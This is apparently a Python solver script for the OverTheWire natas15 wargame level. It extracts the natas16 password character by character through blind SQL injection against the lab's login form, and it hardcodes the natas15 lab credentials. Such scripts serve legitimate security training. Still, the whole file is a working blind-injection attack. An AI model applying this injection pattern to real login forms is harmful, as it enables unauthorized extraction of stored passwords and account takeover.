import requests
import json
from requests.auth import HTTPBasicAuth
import string
import time
possible_chars = string.ascii_uppercase+string.ascii_lowercase+string.digits
found_chars = ''

# r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug',data={'username':'natas16" OR password like "HLWUGKTS2W%'},auth=HTTPBasicAuth(username='natas15',password='SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'))
# print(r.status_code)
# print(r.text)
# for possible_char in possible_chars:
#     print('trying',possible_char)
#     r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug',data={'username':'natas16" AND password like binary "%'+possible_char+'%'},auth=HTTPBasicAuth(username='natas15',password='SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'))
#     if 'This user exists' in r.text:
#         found_chars += possible_char
#         print('found',possible_char)
#     time.sleep(0.1)

found_chars = 'DEGKLMPQVWXYcefhijkmostuv346'
password = ''
for password_index in range(32):
    for possible_char in found_chars:
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug',data={'username':'test" OR password like binary"'+password+possible_char+'%'},auth=HTTPBasicAuth(username='natas15',password='SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'))
        if 'This user exists' in r.text:
            password += possible_char
            print('Found',password)
            break
print(password)
